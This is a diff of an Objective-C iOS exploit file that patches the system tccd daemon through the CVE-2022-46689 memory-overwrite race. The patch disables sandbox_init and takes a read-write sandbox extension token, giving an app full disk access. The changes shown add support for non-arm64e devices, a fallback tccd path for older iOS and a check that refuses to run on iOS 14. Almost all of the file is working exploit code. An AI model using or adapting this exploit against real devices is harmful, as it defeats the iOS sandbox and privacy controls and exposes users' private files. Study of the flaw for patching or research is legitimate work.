@@ -1,12 +1,3 @@
-//
-//  tccd-hijack.m
-//  Mandela
-//
-//  Created by Hariz Shirazi on 2023-01-27.
-//
-
-// Dark magic :)
-
 @import Darwin;
 @import Foundation;
 @import MachO;
@@ -15,7 +6,9 @@
 // you'll need helpers.m from Ian Beer's write_no_write and vm_unaligned_copy_switch_race.m from
 // WDBFontOverwrite
 // Also, set an NSAppleMusicUsageDescription in Info.plist (can be anything)
-#import "extras.h"
+// Please don't call this code on iOS 14 or below
+// (This temporarily overwrites tccd, and on iOS 14 and above changes do not revert on reboot)
+#import "helpers.h"
 #import "vm_unaligned_copy_switch_race.h"
 
 typedef NSObject* xpc_object_t;
@@ -134,8 +127,8 @@ static uint64_t patchfind_got(void* executable_map, size_t executable_length,
   struct section_64* section_array =
       ((void*)data_const_segment) + sizeof(struct segment_command_64);
   struct section_64* first_section = &section_array[0];
-  if (strcmp(first_section->sectname, "__auth_got")) {
-    // TODO(zhuowei): arm64?
+  if (!(strcmp(first_section->sectname, "__auth_got") == 0 ||
+        strcmp(first_section->sectname, "__got") == 0)) {
     return 0;
   }
   uint32_t* indirect_table = executable_map + dysymtab_command->indirectsymoff;
@@ -196,8 +189,8 @@ static bool patchfind(void* executable_map, size_t executable_length,
 
 static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
   // reimplmentation of TCCAccessRequest, as we need to grab and cache the sandbox token so we can
-  // re-use it until next reboot returns the sandbox token if there is one, or nil if there isn't
-  // one.
+  // re-use it until next reboot.
+  // Returns the sandbox token if there is one, or nil if there isn't one.
   xpc_connection_t connection = xpc_connection_create_mach_service(
       "com.apple.tccd", dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), 0);
   xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
@@ -274,7 +267,7 @@ static NSData* patchTCCD(void* executableMap, size_t executableLength) {
     *(uint64_t*)(mutableBytes + offsets.offset_addr_s_kTCCServiceMediaLibrary + 8) =
         strlen("com.apple.app-sandbox.read-write");
   }
-  {
+  if (offsets.is_arm64e) {
     // make sandbox_init call return 0;
     struct dyld_chained_ptr_arm64e_auth_rebase targetRebase = {
         .auth = 1,
@@ -288,11 +281,19 @@ static NSData* patchTCCD(void* executableMap, size_t executableLength) {
     *(struct dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                                    offsets.offset_auth_got__sandbox_init) =
         targetRebase;
+  } else {
+    // make sandbox_init call return 0;
+    struct dyld_chained_ptr_64_rebase targetRebase = {
+        .bind = 0,
+        .next = 2,
+        .target = offsets.offset_just_return_0,
+    };
+    *(struct dyld_chained_ptr_64_rebase*)(mutableBytes + offsets.offset_auth_got__sandbox_init) =
+        targetRebase;
   }
   return data;
 }
 
-// FIXME: This will fail to compile: update for ian's poc
 static bool overwrite_file(int fd, NSData* sourceData) {
   for (int off = 0; off < sourceData.length; off += 0x4000) {
     bool success = false;
@@ -315,6 +316,11 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
                                                            NSError* _Nullable error)) {
   char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
   int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+  if (fd == -1) {
+    // iOS 15.3 and below
+    targetPath = "/System/Library/PrivateFrameworks/TCC.framework/tccd";
+    fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+  }
   off_t targetLength = lseek(fd, 0, SEEK_END);
   lseek(fd, 0, SEEK_SET);
   void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
@@ -322,7 +328,7 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
   NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
   NSData* sourceData = patchTCCD(targetMap, targetLength);
   if (!sourceData) {
-    completion(nil, [NSError errorWithDomain:@"ca.bomberfish.Mandela.tccneuter"
+    completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                         code:5
                                     userInfo:@{NSLocalizedDescriptionKey : @"Can't patchfind."}]);
     return;
@@ -332,10 +338,10 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
     overwrite_file(fd, originalData);
     munmap(targetMap, targetLength);
     completion(
-        nil, [NSError errorWithDomain:@"ca.bomberfish.Mandela.tccneuter"
+        nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                  code:1
                              userInfo:@{
-                               NSLocalizedDescriptionKey : @"GURU MEDITATION: Can't overwrite file, your device may "
+                               NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
                                                            @"not be vulnerable to CVE-2022-46689."
                              }]);
     return;
@@ -350,17 +356,17 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
     NSError* returnError = nil;
     if (extension_token == nil) {
       returnError =
-          [NSError errorWithDomain:@"ca.bomberfish.Mandela.tccneuter"
+          [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                               code:2
                           userInfo:@{
                             NSLocalizedDescriptionKey : @"tccd did not return an extension token."
                           }];
     } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
       returnError = [NSError
-          errorWithDomain:@"ca.bomberfish.Mandela.tccneuter"
+          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                      code:3
                  userInfo:@{
-                   NSLocalizedDescriptionKey : @"GURU MEDITATION: tccd patch failed: returned a media library token "
+                   NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
                                                @"instead of an app sandbox token."
                  }];
       extension_token = nil;
@@ -369,7 +375,20 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
   });
 }
 
-void neuter_tccd(void (^completion)(NSError* _Nullable)) {
+void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
+  if (!NSClassFromString(@"NSPresentationIntent")) {
+    // class introduced in iOS 15.0.
+    // TODO(zhuowei): maybe check the actual OS version instead?
+    completion([NSError
+        errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                   code:6
+               userInfo:@{
+                 NSLocalizedDescriptionKey :
+                     @"Not supported on iOS 14 and below: on iOS 14 the system partition is not "
+                     @"reverted after reboot, so running this may permanently corrupt tccd."
+               }]);
+    return;
+  }
   NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory
                                                                   inDomains:NSUserDomainMask][0];
   NSURL* sourceURL =
@@ -394,9 +413,9 @@ void neuter_tccd(void (^completion)(NSError* _Nullable)) {
     int64_t handle = sandbox_extension_consume(extension_token.UTF8String);
     if (handle <= 0) {
       completion([NSError
-          errorWithDomain:@"ca.bomberfish.Mandela.tccneuter"
+          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                      code:4
-                 userInfo:@{NSLocalizedDescriptionKey : @"GURU MEDITATION: Failed to consume generated extension"}]);
+                 userInfo:@{NSLocalizedDescriptionKey : @"Failed to consume generated extension"}]);
       return;
     }
     [extension_token writeToURL:sourceURL
@@ -406,4 +425,3 @@ void neuter_tccd(void (^completion)(NSError* _Nullable)) {
     completion(nil);
   });
 }
-
